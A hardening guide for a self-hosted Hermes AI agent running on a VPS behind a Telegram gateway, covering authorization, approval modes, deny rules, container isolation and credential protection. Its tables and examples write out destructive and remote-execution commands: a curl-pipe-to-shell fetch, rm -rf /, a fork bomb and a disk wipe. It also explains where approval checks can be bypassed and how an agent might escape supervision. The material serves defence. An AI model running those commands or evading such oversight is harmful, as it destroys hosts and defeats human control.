# Securing Hermes, Step by Step

*A Hostinger VPS + Telegram deployment — 9 phases, every command, every verification step.*

## Before You Begin

> "There isn't really a security feature in Hermes. There's a stack of independent layers that each assume the others might fail. No layer is the whole answer."

Hermes ships with eight official security layers: user authorization, dangerous command approval, file write safety, container isolation, MCP credential filtering, context file scanning, cross-session isolation, and input sanitization.

The important thing to understand before you start typing commands is that these layers are independent, and each one assumes the others might fail. Turning one on does not substitute for the others. The layer that catches a given problem is not always the layer you would expect.

**Why a VPS changes the calculus.** On a laptop you are watching every approval prompt as it appears. On a VPS you are not. Your Hermes instance is running 24/7, answering Telegram messages and firing cron jobs while you sleep. That changes which defaults are acceptable.

The single most consequential difference: on a laptop, the local terminal backend with approval prompts is defensible. On a VPS you are not staring at, it is a worse default. This lab pushes you toward container isolation and explicit deny rules precisely because nobody is watching.

**What you need**

- SSH access to your Hostinger VPS.
- A working Hermes install with the Telegram gateway running.
- Your Telegram numeric user ID (Phase 2 shows you how to get it).
- A second Telegram account, or a friend, for the authorization test in Phase 2.
- About 60–90 minutes.

> **Take a snapshot first**
> Before changing anything, take a VPS snapshot from your Hostinger control panel. Hostinger VPS plans include snapshot and backup functionality — use it. If you lock yourself out with a firewall rule or break the gateway with a config change, a snapshot is a two-minute recovery instead of a rebuild. Do this now, not after something goes wrong.

---

## Phase 0 — Baseline: Know What You Are Starting With

*You cannot harden what you have not measured.*

Before changing a single setting, capture your current state. This gives you a before/after comparison and catches anything already misconfigured.

**Step 0.1 — Version and health check**

```bash
# SSH into your Hostinger VPS first
ssh root@your-vps-ip

# What version are you on?
hermes --version

# Full health check --- surfaces known issues, vulnerable
# dependencies, and config problems
hermes doctor
```

Read the `hermes doctor` output carefully. It runs the built-in supply-chain advisory scanner, which flags Python packages in your venv matching a curated catalogue of known-compromised versions. If it reports anything, act on it before continuing.

**Step 0.2 — Audit your current configuration**

```bash
# What is in your config right now?
cat ~/.hermes/config.yaml

# What secrets exist, and what are their permissions?
ls -la ~/.hermes/
ls -la ~/.hermes/.env

# Which terminal backend are you running?
grep -A5 'terminal:' ~/.hermes/config.yaml

# What approval mode?
grep -A8 'approvals:' ~/.hermes/config.yaml
```

**Step 0.3 — Check for the dangerous defaults**

```bash
# Is allow-all set anywhere? This is the #1 misconfiguration.
grep -i 'ALLOW_ALL' ~/.hermes/.env

# Is YOLO mode set in the environment?
grep -i 'YOLO' ~/.hermes/.env
env | grep -i YOLO

# Are you running the gateway as root?
ps aux | grep -i hermes
```

> **⚠️ Watch out**
> If grep finds `GATEWAY_ALLOW_ALL_USERS=true` or any platform `ALLOW_ALL` flag, your agent is currently open to anyone who can find your bot on Telegram. That is the single highest-severity finding possible at this stage. Fix it in Phase 2 — or comment it out right now and restart the gateway.

**Step 0.4 — Have Hermes audit itself**

Ask the agent to review its own security posture. It has file access to its own config, so it can actually read what is set.

> **💬 Self-audit prompt**
> Do a security review of your own installation.
> Read `~/.hermes/config.yaml` and report on:
> 1. Which terminal backend is configured, and what that means for command isolation
> 2. What approval mode is set, and whether `cron_mode` is deny
> 3. Whether any allow-all user flags are present
> 4. Whether `write_approval` is enabled for memory and skills
> 5. Whether the website blocklist and Tirith are enabled
>
> For each finding, tell me the current value, the recommended value for a public VPS deployment, and the risk if left as-is. Do NOT read or print the contents of `~/.hermes/.env` — just confirm the file exists and report its permissions.

That final instruction matters in its own right: the agent has the file access to read your API keys and would happily print them into a Telegram chat if you asked. Scoping the request is your job, not the agent's — this is the whole "intelligent but untrusted assistant" principle in one line of a prompt.

---

## Phase 1 — Harden the VPS Itself

*Before Hermes, secure the machine underneath it.*

Hermes security assumes a properly configured host. If someone can SSH into your VPS as root with a weak password, none of the Hermes layers matter. Do this first.

**Step 1.1 — Create a non-root user**

Never run the gateway as root. This is item 8 on the official production deployment checklist, and it is the foundation everything else sits on.

```bash
# Create the user
adduser hermesop

# Give it sudo for administrative tasks
usermod -aG sudo hermesop

# If you use Docker as the terminal backend, it needs the docker group
usermod -aG docker hermesop

# Copy your SSH key across
rsync --archive --chown=hermesop:hermesop ~/.ssh /home/hermesop/

# Test in a SECOND terminal before closing this one
ssh hermesop@your-vps-ip
```

> **⚠️ Watch out**
> Always test the new user login in a second terminal window before closing your root session. If the key copy failed, that root session is your only way back in.

**Step 1.2 — Lock down SSH**

```
# /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config

# Set these values:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222              # move off 22 to cut scanner noise
AllowUsers hermesop

# Apply
sudo systemctl restart sshd
```

> **✅ Verify: SSH hardening**
> ```bash
> # From your LOCAL machine, in a new terminal:
> ssh -p 2222 hermesop@your-vps-ip   # should work
> ssh root@your-vps-ip               # should be refused
> # Keep your existing session open until both are confirmed.
> ```

**Step 1.3 — Firewall**

Hermes's Telegram gateway makes outbound connections to Telegram's API. It does not need any inbound ports open. That means your firewall can be aggressive.

```bash
sudo apt update && sudo apt install ufw -y
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 2222/tcp comment 'SSH'

# Note: no port needed for the Telegram gateway --- it is
# outbound-only. Only open ports you have a reason for.
sudo ufw enable
sudo ufw status verbose
```

> **Hostinger firewall**
> Hostinger VPS plans include a firewall you can configure from the control panel, separate from UFW on the machine itself. Configure both. The panel firewall stops traffic before it reaches your VPS; UFW is your second layer if a panel rule is ever wrong or gets reset. This is defence in depth applied to your own infrastructure — exactly the pattern Hermes uses internally.

**Step 1.4 — Fail2Ban and automatic updates**

```bash
# Fail2Ban for SSH brute-force protection
sudo apt install fail2ban -y
sudo systemctl enable --now fail2ban
sudo fail2ban-client status sshd

# Unattended security upgrades
sudo apt install unattended-upgrades -y
sudo dpkg-reconfigure --priority=low unattended-upgrades
```

---

## Phase 2 — Lock Down the Telegram Gateway

*Who is allowed to talk to your agent at all.*

This is the layer that matters most for your deployment. Your agent is reachable on Telegram, which means it is reachable by anyone who finds the bot. Authorization is the gate.

**Step 2.1 — Understand the check order**

Hermes checks authorization in a strict order. Knowing it tells you exactly where your configuration slots in:

| # | Check |
|---|---|
| 1 | Per-platform allow-all flag (e.g. `TELEGRAM_ALLOW_ALL_USERS`) |
| 2 | DM pairing approved list |
| 3 | Platform-specific allowlist (`TELEGRAM_ALLOWED_USERS`) |
| 4 | Global allowlist (`GATEWAY_ALLOWED_USERS`) |
| 5 | Global allow-all (`GATEWAY_ALLOW_ALL_USERS`) |
| 6 | Default: DENY |

The default is deny. If you configure nothing, nobody gets in, and the gateway logs a warning at startup. That is the correct default — your job is to open it up as narrowly as possible, not to leave it open.

**Step 2.2 — Get your Telegram user ID**

You need your numeric ID, not your @username. The easiest way is to message a bot that reports it back.

```bash
# In Telegram, message @userinfobot or @RawDataBot
# It replies with your numeric ID, e.g. 123456789

# Alternatively, check your Hermes gateway logs after
# messaging your own bot --- the denied attempt is logged
# with the user ID that tried:
tail -50 ~/.hermes/logs/gateway.log | grep -i 'unauthorized'
```

**Step 2.3 — Set the allowlist**

```bash
# ~/.hermes/.env
nano ~/.hermes/.env

# Add ONLY the user IDs that should have access:
TELEGRAM_ALLOWED_USERS=123456789

# For multiple users, comma-separated with no spaces:
# TELEGRAM_ALLOWED_USERS=123456789,987654321

# Make sure these are NOT present --- delete if found:
# GATEWAY_ALLOW_ALL_USERS=true ← DELETE
# TELEGRAM_ALLOW_ALL_USERS=true ← DELETE
```

> **⚠️ Watch out**
> `GATEWAY_ALLOW_ALL_USERS=true` is a testing flag. Plenty of quick-start guides walk you through setting it and never mention undoing it. On a VPS with terminal access, an open gateway means anyone on Telegram who finds your bot can run commands on your server. Search your `.env` for it every time you do a security review.

**Step 2.4 — Configure DM pairing**

Pairing is the more flexible option: an unknown user messages the bot, receives a one-time code, and you approve it from the CLI. The design draws on OWASP and NIST SP 800-63 guidance — codes are cryptographically random, time-bounded, and approval is an explicit human action.

```yaml
# ~/.hermes/config.yaml
unauthorized_dm_behavior: pair   # pair | ignore
# 'pair' is the default for chat-style DM platforms.
# Use 'ignore' if you want unknown users silently dropped.
```

The pairing system's built-in protections are worth knowing: 8-character codes from a 32-character unambiguous alphabet (no 0/O/1/I), cryptographic randomness, 1-hour expiry, rate limiting of one request per user per 10 minutes, a maximum of 3 pending codes per platform, a 1-hour lockout after 5 failed approval attempts, chmod 0600 on all pairing files, and codes are never written to stdout.

```bash
hermes pairing list                          # pending + approved
hermes pairing approve telegram ABC12DEF     # approve a code
hermes pairing revoke telegram 123456789     # revoke access
hermes pairing clear-pending                 # clear all pending
```

> **🐳 The Docker gotcha that will bite you**
> If you are running Hermes in the official Docker image, pairing approvals fail silently when run as root. The container runs the gateway as the unprivileged `hermes` user (uid 10000), but `docker exec` defaults to root. Approval files created by root are written `0600 root:root`, and the gateway cannot read them. The approval appears to succeed and simply does not work. Always pass `-u hermes`:
> ```bash
> docker exec -u hermes hermes-agent hermes pairing approve telegram ABC12DEF
> ```
> If you already ran it as root and the user is still unauthorized, restart the container — the entrypoint fixes ownership on the next start.

**Step 2.5 — Test it**

> **✅ Verify: Authorization is actually enforced**
> ```bash
> # 1. Restart the gateway to pick up .env changes
> hermes gateway restart
> # (or: sudo systemctl restart hermes-gateway)
>
> # 2. From YOUR Telegram account, message the bot.
> # Expected: it responds normally.
>
> # 3. From a SECOND Telegram account, message the bot.
> # Expected with pair mode: you get a pairing code.
> # Expected with ignore mode: silence.
> # NEVER expected: a normal agent response.
>
> # 4. Confirm the denial was logged
> grep -i 'unauthorized\|denied' ~/.hermes/logs/gateway.log | tail -20
> ```

If the second account gets a normal response, stop and re-check your `.env`. Something is still set to allow-all.

---

## Phase 3 — Command Execution Controls

*What the agent may run, and what it must ask about first.*

This is the longest phase in the lab, and deliberately so. Approvals are the layer most often misunderstood — people either over-trust them or switch them off out of frustration. Both are mistakes, and both come from not knowing exactly what the layer does.

### 3.1 What an Approval Actually Is

Before executing any command, Hermes checks it against a curated list of dangerous patterns defined in `tools/approval.py`. If a pattern matches, execution pauses and you must explicitly approve before anything runs.

> Approval is a tripwire for accidents, not a defence against an adversarial agent. It is the human-in-the-loop seatbelt; the container is the crumple zone.

That framing matters. Pattern matching against shell commands is fundamentally incomplete — shell is Turing-complete, and a command can be obfuscated, split across two tool calls, or written to a file and sourced. Hermes normalises input before scanning (strips ANSI escapes, null bytes, applies NFKC Unicode normalisation), which closes the obvious tricks. But it is still a denylist over an open-ended attack surface.

So: approvals catch a model that goes off-script unintentionally — wrong path, missing flag, confidently wrong command. When something has actually compromised the model's input, approvals are the wrong layer to be relying on. That is what Phase 4 is for.

### 3.2 The Full Approvals Configuration

Five keys live under `approvals` in `~/.hermes/config.yaml`. Most guides only mention the first one.

```yaml
# ~/.hermes/config.yaml --- every approvals key
approvals:
  mode: smart                      # smart | manual | off
  timeout: 300                     # seconds to wait for a reply
  cron_mode: deny                  # deny | approve
  mcp_reload_confirm: true         # /reload-mcp asks first
  destructive_slash_confirm: true  # /clear /new /reset /undo ask first
```

| Key | Default | What it controls |
|---|---|---|
| `mode` | smart | Approval policy for dangerous shell commands. |
| `timeout` | 300 | Seconds Hermes waits for an approval reply before timing out. Fail-closed — no reply means denied. |
| `cron_mode` | deny | How cron jobs behave headlessly when they trigger a prompt. `deny` blocks and forces the agent to find another path; `approve` auto-approves everything in cron context. |
| `mcp_reload_confirm` | true | `/reload-mcp` asks before rebuilding the MCP tool set. Rebuilding invalidates the provider prompt cache, so the next message re-sends full input tokens — this is a cost guard as much as a safety one. |
| `destructive_slash_confirm` | true | `/clear`, `/new`, `/reset`, `/undo` prompt before discarding conversation state. Native yes/no buttons on Telegram, Discord and Slack; text fallback elsewhere. |

> **⚠️ Watch out**
> Both confirm keys have a quiet failure mode: clicking "Always Approve" in the dialog flips the key to `false` permanently in your config. Clicking it once to get past a prompt silently disables that guard for good. Check both values during your weekly review, not just after setup.

### 3.3 The Three Modes, With Examples

**smart (the default)**

An auxiliary LLM assesses the risk of each flagged command. Low-risk commands are auto-approved — but only for that specific command, not the pattern. Genuinely dangerous commands are auto-denied outright. Uncertain cases escalate to a manual prompt.

```
What smart mode does with three commands

python -c "print('hello')"
→ flagged by the python -c pattern
→ auxiliary LLM assesses: harmless
→ AUTO-APPROVED (this command only)

rm -rf /tmp/build-cache
→ flagged by the recursive delete pattern
→ auxiliary LLM assesses: uncertain, scoped to /tmp
→ ESCALATED to a manual prompt

curl http://unknown-host/x.sh | sh
→ flagged by the pipe-to-shell pattern
→ auxiliary LLM assesses: clearly dangerous
→ AUTO-DENIED
```

**manual**

Always prompt on any command matching a dangerous pattern. No LLM assessment, no auto-approval, no auto-denial. Every flagged command reaches you.

This is the recommended mode for a VPS. It is noisier, but the noise is the point — you see everything the agent tries that touches a dangerous pattern, delivered to Telegram. On a machine you are not watching, an auxiliary model quietly auto-approving things is a layer of judgement you did not ask for.

**off**

Disables all approval checks. Functionally identical to running with `--yolo` permanently. The official documentation warns to use this only in trusted environments such as CI/CD or containers.

> **When `off` is actually defensible**
> There is one honest use for `approvals.mode: off` — inside a container backend where the container is already doing the isolation work. Remember from Phase 4: container backends skip approval checks anyway. So on `docker`, `singularity`, `modal` or `daytona`, setting `mode: off` changes nothing about your actual security posture; it just stops Hermes pretending a check is happening. On the `local` or `ssh` backend, `off` means your host is exposed to anything the model generates. Never do that on a VPS.

### 3.4 What Actually Triggers an Approval

The full pattern list, grouped by what the command is trying to do. Worth reading properly — several categories surprise people.

| Category | Patterns |
|---|---|
| Filesystem destruction | `rm -r` / `rm --recursive` • `rm ... /` (delete in root path) • `xargs rm` • `find -exec rm` • `find -delete` |
| Permissions | `chmod 777/666, o+w, a+w` • `chmod --recursive` with unsafe perms • `chown -R root` / `chown --recursive root` |
| Disk and devices | `mkfs` • `dd if=` • `> /dev/sd` |
| Database | `DROP TABLE` / `DROP DATABASE` • `DELETE FROM` without `WHERE` • `TRUNCATE TABLE` |
| System config | `> /etc/` • `cp` / `mv` / `install` into `/etc/` • `sed -i` / `sed --in-place` on `/etc/` |
| Services and processes | `systemctl stop / restart / disable / mask` • `kill -9 -1` • `pkill -9` • fork bomb patterns |
| Inline script execution | `bash -c` / `sh -c` / `zsh -c` / `ksh -c` (including combined flags like `-lc`) • `python -e` / `perl -e` / `ruby -e` / `node -c` |
| Remote code execution | `curl ... \| sh` • `wget ... \| sh` • `bash <(curl ...)` • `sh <(wget ...)` |
| Sensitive file writes | `tee` to `/etc/`, `~/.ssh/`, `~/.hermes/.env` • `>` and `>>` to the same paths |
| Self-preservation | `pkill` / `killall` hermes or gateway • gateway run with `&`, `disown`, `nohup` or `setsid` |

> **Two categories worth understanding**
> **Inline script execution** — `bash -c`, `python -e` and friends are flagged not because they are inherently destructive, but because they are the standard way to smuggle a dangerous command past a pattern matcher. Flagging the wrapper closes that hole. **Self-preservation** — Hermes flags attempts to kill its own process or gateway, and attempts to start a gateway outside the service manager using `&`, `disown`, `nohup` or `setsid`. An agent that can kill its own supervisor or spawn an unmanaged copy of itself is an agent that can escape your monitoring. This category exists because someone thought about that.

### 3.5 The Approval Flow — CLI

On the interactive CLI, a flagged command produces an inline prompt:

```
⚠️ DANGEROUS COMMAND: recursive delete
rm -rf /tmp/old-project
[o]nce | [s]ession | [a]lways | [d]eny
Choice [o/s/a/D]:
```

| Option | What it does |
|---|---|
| once | Allow this single execution. Nothing is remembered. |
| session | Allow this pattern for the rest of the session. Forgotten on restart. |
| always | Add the pattern to the PERMANENT allowlist, saved to `config.yaml`. Silently approved in all future sessions, forever. |
| deny | Block the command. This is the DEFAULT — note the capital D in `[o/s/a/D]`. Pressing Enter denies. |

> **⚠️ Watch out**
> "always" is the option that gets people. It is one keystroke away from "once", and it permanently allowlists that pattern across every future session with no further prompting. Reach for "session" until you are certain — session is forgotten on restart, always is not.

### 3.6 The Approval Flow — Telegram

This is the one that matters for your deployment. On messaging platforms, the agent sends the dangerous command details to the chat and waits for your reply.

```
APPROVE with any of: yes y approve ok go
DENY with any of: no n deny cancel
# HERMES_EXEC_ASK=1 is set automatically when the gateway runs,
# so this flow is active by default on Telegram.
```

> **The timeout is your friend here**
> The default timeout is 300 seconds, and it is fail-closed: if no reply arrives in time, the command is DENIED. Think about what that means on a Telegram deployment. Your agent hits a dangerous command at 3am. You are asleep. Nothing runs, and the request expires. That is exactly the behaviour you want — no hanging process, no silent auto-approval. This is why raising the timeout is usually the wrong instinct. A long timeout means a dangerous command sits armed for longer waiting for a groggy yes.

### 3.7 The Permanent Allowlist

Every command you approve with "always" is written to `config.yaml` and loaded at startup, then silently approved in all future sessions.

```bash
# What is in the allowlist right now?
grep -A10 'command_allowlist' ~/.hermes/config.yaml

# It looks like this:
# command_allowlist:
#   - rm
#   - systemctl

# Review and remove entries
hermes config edit
```

> **⚠️ Watch out**
> Look at that example again. An allowlist entry of `rm` means every `rm` command is now silently approved — not just the specific one you were looking at when you clicked "always". Allowlist entries are patterns, not exact commands. Audit this list weekly; it is the most likely place for your security posture to have quietly degraded.

### 3.8 YOLO Mode — What It Is and What It Is Not

YOLO bypasses all dangerous command approval prompts for the current session. It is the single highest-risk setting in Hermes, and it is worth understanding precisely, because you will encounter it and be tempted.

**Three ways it turns on**

```bash
# 1. CLI flag at launch
hermes --yolo
hermes chat --yolo

# 2. Slash command mid-session (a TOGGLE)
/yolo

# 3. Environment variable
export HERMES_YOLO_MODE=1
```

Internally all three set the same thing: `HERMES_YOLO_MODE`, which is checked before every command execution. The slash command is a toggle — each use flips it:

```
> /yolo
⚡ YOLO mode ON --- all commands auto-approved. Use with caution.
> /yolo
⚠ YOLO mode OFF --- dangerous commands will require approval.
```

**The two visual reminders**

Hermes deliberately makes YOLO hard to forget about. When it is active you get a red banner line at session start reading "⚠ YOLO mode — all approval prompts bypassed", and a ⚠ YOLO fragment in the status bar that updates live as you toggle. The banner is hidden when YOLO is off, so the default session start stays uncluttered.

> **⚠️ Watch out**
> Both reminders are designed for an interactive session where a human is looking at the screen. On a Telegram gateway, nobody is looking at a banner or a status bar. YOLO on a gateway is therefore far more dangerous than YOLO in a terminal — the safety affordance that makes it survivable simply is not visible to you.

**What YOLO does NOT disable**

This is the part people consistently get wrong. YOLO is scoped to one specific layer. Everything else keeps running:

| YOLO disables | YOLO does not disable |
|---|---|
| Dangerous command approval prompts, for the current session only | The hardline blocklist |
| | `approvals.deny` user rules |
| | Container isolation |
| | Gateway user authorization |
| | Environment variable filtering |
| | Tirith pre-execution scanning |
| | File write path denylist |
| | SSRF protection and the website blocklist |

So YOLO removes one layer of eight. That is genuinely less catastrophic than it sounds — and it is still not something to run on a VPS, because the layer it removes is the one that catches the honest mistakes that make up most real incidents.

### 3.9 The Hardline Blocklist — The Floor Below YOLO

Some commands are refused no matter what. Not overridable by `--yolo`, not by `/yolo`, not by `approvals.mode: off`, not by cron running in headless approve mode, and not by clicking "allow always". There is no flag.

The blocklist trips before the approval layer even sees the command. If you hit it, the tool call returns an explanatory error to the agent and nothing runs.

| Pattern | Why it is hardline |
|---|---|
| `rm -rf /` and obvious variants | Wipes the filesystem root |
| `rm -rf --no-preserve-root /` | The explicit "yes I mean root" variant |
| `:(){ :\|:& };:` | Bash fork bomb — pegs the host until reboot |
| `mkfs.*` on a mounted root device | Formats the live system |
| `dd if=/dev/zero of=/dev/sd*` | Zeroes a physical disk |
| Piping untrusted URLs to `sh` at the rootfs top level | RCE vector too broad to approve |

The list is not exhaustive and is kept in sync with `tools/approval.py::UNRECOVERABLE_BLOCKLIST` in the source. If a legitimate workflow genuinely needs one of these — you operate a wipe-and-reinstall pipeline, say — the official guidance is to run it outside the agent.

### 3.10 Your Own Deny Rules

The hardline blocklist is fixed and shipped in code. `approvals.deny` is its user-editable counterpart: glob patterns that block matching commands unconditionally, checked before `--yolo`, `/yolo` and `approvals.mode: off` are consulted.

The official framing is "yolo-with-exceptions" — let the agent do everything, except these specific things, ever. For a VPS, it is better thought of as encoding the things that would lock you out of your own server.

```yaml
# ~/.hermes/config.yaml --- deny rules for a VPS
approvals:
  mode: manual
  cron_mode: deny
  deny:
    # Official examples
    - "git push --force*"
    - "*curl*|*sh*"
    - "dd if=* of=/dev/*"
    # VPS-specific: things that would lock you out
    - "ufw disable"
    - "*ufw*delete*"
    - "systemctl stop ssh*"
    - "systemctl disable ssh*"
    - "*shutdown*"
    - "*reboot*"
    # Credential and key protection
    - "*~/.ssh*"
    - "*/.hermes/.env*"
    - "*chmod 777*"
```

**How matching works**

- **fnmatch globs.** `*`, `?` and `[...]` are supported, matched case-insensitively against the whole command text. `git push --force*` matches `git push --force origin main` but not `git push origin main`.
- **Deobfuscation-aware.** Matching runs over the same normalised and deobfuscated command variants the dangerous-pattern detector uses, so quoting tricks like `git pu""sh --force` do not slip past a rule.
- **Host-reaching backends only.** Deny rules apply to local, SSH, and host-mounted Docker. Isolated container backends skip the guard stack entirely — nothing they run can touch the host anyway.
- **Immediate effect.** The config cache is mtime-keyed, so changes apply without a session restart.
- **Clear failure.** A denied command returns a BLOCKED error telling the agent not to retry or rephrase. Nothing runs.

> **⚠️ Watch out**
> YAML quoting is a real trap here. Always quote your patterns. A bare leading `*` is a YAML alias and the file will fail to parse. Braces, exclamation marks and colons also have YAML meanings. Single quotes are safest for shell-ish content — and test your config loads before you walk away from the machine.

> **The threat model for deny rules**
> The official documentation is explicit: deny rules are a guardrail against an honest-but-wrong agent — the same threat model as the dangerous-pattern detector. They are NOT a sandbox against a deliberately adversarial process. For that, you need an isolated backend or an egress-restricted environment. Deny rules stop your agent from accidentally disabling your firewall. They do not stop a compromised agent that is actively trying to get around them.

### 3.11 Putting It Together: The Precedence Order

Six mechanisms interact here, and the order they fire in is what determines whether a command runs. This is the single most useful thing to sketch out for yourself.

```
Decision flow for a command on a HOST-REACHING backend

Agent generates a command
        │
        ▼
1. HARDLINE BLOCKLIST ── match? ─→ BLOCKED. No override.
        │
        ▼
2. approvals.deny rules ── match? ─→ BLOCKED. Before yolo.
        │
        ▼
3. YOLO / mode: off? ── yes? ─→ RUNS, no prompt.
        │
        ▼
4. command_allowlist ── match? ─→ RUNS, silently.
        │
        ▼
5. Dangerous pattern? ── no? ─→ RUNS normally.
        │ yes
        ▼
6. approvals.mode
   smart  → aux LLM: approve / deny / escalate
   manual → prompt you (Telegram or CLI)
        │
        ▼
   No reply in `timeout` seconds → DENIED (fail-closed)
```

> **And on a container backend?**
> Steps 2 through 6 do not run at all. Docker, Singularity, Modal and Daytona skip the entire guard stack, because the container is the boundary. Only step 1 — the hardline blocklist — still applies. That is the trade you accept in Phase 4, and it is why your container configuration matters so much. Inside the container the agent runs what it likes.

### 3.12 Verify Your Approval Configuration

```bash
# Confirm YOLO is not active anywhere

# Environment variable?
grep -i 'HERMES_YOLO_MODE' ~/.hermes/.env
env | grep -i YOLO

# Is approvals.mode set to off?
grep -A8 'approvals:' ~/.hermes/config.yaml

# Does the service file pass --yolo?
sudo systemctl cat hermes-gateway | grep -i yolo

# Have the confirm guards been flipped to false?
grep -E 'mcp_reload_confirm|destructive_slash_confirm' ~/.hermes/config.yaml

# What has been permanently allowlisted?
grep -A10 'command_allowlist' ~/.hermes/config.yaml
```

> **✅ Verify: Live tests — run these from Telegram**
> ```
> # 1. Should trigger an approval prompt in your chat:
> # Ask: "create a test dir in /tmp then remove it recursively"
> # Expected: approval request arrives. Reply 'no' to deny.
>
> # 2. Should be BLOCKED by your deny rule, with no prompt:
> # Ask: "disable the ufw firewall"
> # Expected: BLOCKED error. No approval request at all.
>
> # 3. Should hit the hardline blocklist:
> # Ask: "run rm -rf --no-preserve-root /"
> # Expected: refused outright with an explanatory error.
>
> # 4. Timeout behaviour:
> # Trigger test 1 again and simply do not reply.
> # Expected: after 300s, denied automatically.
> ```

Test 2 is the most instructive: the absence of an approval prompt is the point — a deny rule is not a stronger prompt, it is a refusal to even ask.

---

## Phase 4 — Container Isolation

*The only layer the official docs call a real boundary.*

For a production gateway deployment, the official guidance is unambiguous: use a container backend to isolate agent commands from your host.

```yaml
# ~/.hermes/config.yaml --- terminal block
terminal:
  backend: docker
  docker_image: "nikolaik/python-nodejs:python3.11-nodejs20"
  docker_forward_env: []       # ← EMPTY. Keep secrets out.
  container_cpu: 1
  container_memory: 5120       # MB
  container_disk: 51200        # MB
  container_persistent: false  # ephemeral for a public gateway
```

**Step 4.1 — What you get automatically**

Every container Hermes starts runs with hardened flags applied by default. You do not configure these — they are baked in:

```bash
--cap-drop ALL                     # drop all Linux capabilities
--cap-add DAC_OVERRIDE             # write to bind-mounted dirs
--cap-add CHOWN                    # package managers need this
--cap-add FOWNER                   # package managers need this
--security-opt no-new-privileges   # block privilege escalation
--pids-limit 256                   # stops fork bombs
--tmpfs /tmp:rw,nosuid,size=512m
--tmpfs /var/tmp:rw,noexec,nosuid,size=256m
```

**Step 4.2 — The trade-off you must understand**

> **Container backends skip approval entirely**
> When running `docker`, `singularity`, `modal`, or `daytona`, dangerous command checks are SKIPPED. The reasoning is sound: if the container holds, the regex check is redundant; if the container fails, the regex was not going to save you. But it means that inside your container, the agent runs whatever it decides to run, with no prompt. Your container configuration IS your security posture. Three consequences for your setup:
> - Keep `docker_forward_env` EMPTY. Every variable you forward is one the agent can read and exfiltrate.
> - Prefer `container_persistent: false` on a public gateway. Persistent mode bind-mounts a workspace that survives across runs — ask yourself whether you would notice a malicious file living in `~/.hermes/sandboxes/` for a week.
> - The hardline blocklist still applies inside containers. That is your one remaining floor.

> **✅ Verify: Container backend is active**
> ```bash
> # Restart Hermes, then ask the agent to run: hostname && ls /
> # The output should show a container hostname and a
> # container filesystem --- NOT your VPS hostname.
>
> # Confirm containers are being created:
> docker ps -a | head
>
> # Inspect the flags on a running sandbox:
> docker inspect <container-id> | grep -A5 CapDrop
> ```

---

## Phase 5 — Credential and File Protection

*Stop the agent reaching what it should never touch.*

**Step 5.1 — File permissions**

```bash
chmod 700 ~/.hermes
chmod 600 ~/.hermes/.env
chmod 700 ~/.hermes/skills
chmod 700 ~/.hermes/pairing

# Verify
ls -la ~/.hermes/
```

**Step 5.2 — Know what is already protected**

Before `write_file` or `patch` touches disk, Hermes checks the path against a denylist. These are always blocked, with no approval prompt and no way to override from chat:

| Category | Examples |
|---|---|
| OS credential stores | `~/.ssh/`, `~/.aws/`, `~/.kube/`, `/etc/sudoers`, `~/.netrc` |
| Hermes credential stores | `auth.json`, `.env`, `.anthropic_oauth.json`, `mcp-tokens/`, `pairing/` |
| Project secret files | `.env`, `.env.local`, `.env.production`, `.envrc` anywhere on disk |

> **⚠️ Watch out**
> Write guards apply to `write_file` and `patch` ONLY. The terminal tool runs as the same OS user and can still `cat` or overwrite those paths via shell commands. The denylist reduces accidental damage and gives the model a clear stop signal — it does not sandbox a hostile agent. That is what Phase 4 is for.

**Step 5.3 — Optional write sandbox**

`HERMES_WRITE_SAFE_ROOT` restricts `write_file` and `patch` to specific directory prefixes. Anything outside is hard-blocked. The official Docker image sets it to `/opt/data` automatically.

```bash
# Allow a workspace AND Hermes home (colon-separated on Unix)
export HERMES_WRITE_SAFE_ROOT=/home/hermesop/work:/home/hermesop/.hermes
```

> **⚠️ Watch out**
> Do not add this to `~/.hermes/.env` casually. If you point it at only a project directory, the agent can no longer write to `~/.hermes/cron/jobs.json`, profile skills, or other Hermes state — and things will break in confusing ways. Include your Hermes home if you set it at all.

**Step 5.4 — MCP credential filtering**

If you connect MCP servers, know what they receive. Only these variables pass through to MCP stdio subprocesses: `PATH`, `HOME`, `USER`, `LANG`, `LC_ALL`, `TERM`, `SHELL`, `TMPDIR`, plus any `XDG_*` variables. Everything else — API keys, tokens, secrets — is stripped.

```yaml
# Giving an MCP server only what it needs
mcp_servers:
  github:
    command: "npx"
    args: ["-y", "@modelcontextprotocol/server-github"]
    env:
      GITHUB_PERSONAL_ACCESS_TOKEN: "ghp_..."  # only this
```

Error messages from MCP tools are also sanitised before reaching the model. GitHub PATs, OpenAI-style keys, bearer tokens, and `token=`/`key=`/`password=`/`secret=` parameters are replaced with `[REDACTED]`.

---

## Phase 6 — Network and Content Controls

*Limit what the agent can reach and what can reach it.*

**Step 6.1 — Verify SSRF protection**

All URL-capable tools validate addresses before fetching. This is on by default and blocks private networks (RFC 1918), loopback, link-local including cloud metadata at `169.254.169.254`, CGNAT space used by Tailscale and WireGuard, and cloud metadata hostnames. DNS failures are treated as blocked — fail-closed — and redirect chains are re-validated at each hop.

```yaml
# Confirm it has not been disabled
grep -A3 'security:' ~/.hermes/config.yaml

# You want either no entry, or explicitly:
security:
  allow_private_urls: false   # default --- keep it
```

> **⚠️ Watch out**
> `allow_private_urls: true` is a deliberate trust boundary. It exists for legitimate cases — LAN-only Ollama endpoints, internal wikis, `home.arpa` resolution. On a public-facing VPS gateway, leave it off. With it on, a prompt-injected URL can reach your local network and your cloud metadata endpoint.

**Step 6.2 — Website blocklist**

```yaml
# ~/.hermes/config.yaml
security:
  allow_private_urls: false
  website_blocklist:
    enabled: true
    domains:
      - "*.internal.company.com"
      - "admin.example.com"
```

The blocklist is enforced across `web_search`, `web_extract`, `browser_navigate`, and every URL-capable tool. Blocked requests return an error explaining the domain is blocked by policy.

**Step 6.3 — Tirith pre-execution scanning**

Tirith is a Rust binary that scans command content before execution, catching things pattern matching misses: homograph URL spoofing, pipe-to-interpreter patterns, and terminal injection attacks. It auto-installs from GitHub releases with SHA-256 checksum verification, and cosign provenance verification when cosign is available.

```yaml
# ~/.hermes/config.yaml
security:
  tirith_enabled: true
  tirith_path: "tirith"
  tirith_timeout: 5
  tirith_fail_open: false   # ← CHANGE THIS from the default
```

> **`tirith_fail_open`: the default is not what you want on a server**
